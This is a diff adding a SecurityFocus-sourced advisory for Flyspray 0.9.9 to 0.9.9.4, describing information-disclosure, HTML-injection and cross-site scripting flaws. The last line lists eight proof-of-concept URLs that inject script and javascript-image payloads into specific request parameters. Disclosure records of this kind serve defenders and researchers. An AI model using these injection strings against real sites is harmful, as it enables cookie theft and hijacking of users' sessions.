@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/28076/info
+
+Flyspray is prone to an information-disclosure issue, an HTML-injection issue, and multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues determine valid usernames and passwords via brute-force attacks or to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials, control how the site is rendered to the user, and launch other attacks.
+
+These issues affect Flyspray 0.9.9 to 0.9.9.4.
+
+http://www.example.com/index.php?do=myprofile&tasks_perpage=<script>alert('DSecRG XSS')</script> http://www.example.com/index.php?do=myprofile&time_zone=<img src="javascript:alert('DSecRG XSS')"> http://www.example.com/index.php?do=admin&area=newproject&anon_open=<img src="javascript:alert('DSecRG XSS')"> http://www.example.com/index.php?do=admin&area=cat&rgt[4]=<script>alert('DSecRG XSS')</script> http://www.example.com/index.php?do=pm&area=prefs&project_is_active=<img src="javascript:alert('DSecRG XSS')"> http://www.example.com/index.php?do=details&project_id=<script>alert('DSecRG XSS')</script> http://www.example.com/index.php?do=details&item_status=<img src="javascript:alert('DSecRG XSS')"> http://www.example.com/index.php?do=details&item_summary=<script>alert('DSecRG XSS')</script> 
